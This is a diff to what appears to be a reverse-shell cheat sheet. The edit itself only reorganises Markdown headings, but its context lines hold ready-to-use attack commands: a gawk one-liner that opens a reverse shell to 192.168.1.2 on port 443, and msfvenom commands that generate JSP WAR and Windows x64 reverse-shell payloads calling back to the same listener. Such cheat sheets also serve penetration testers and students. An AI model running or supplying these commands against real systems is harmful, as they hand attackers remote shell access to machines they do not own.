@@ -61,11 +61,13 @@
 
   ```awk 'BEGIN {s = "/inet/tcp/0/192.168.1.2/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null```
 
+
+
+# Msfvenom
+
 * War
 
   ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f war > reverse.war ```
-
-# Msfvenom
 
 ## Windows
 
@@ -87,7 +89,7 @@
 
   * x64 ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f exe > reverse.exe```
 
-# Linux
+## Linux
 
 * Meterpreter (Metasploit Listener multi/handler) [Staged]
 
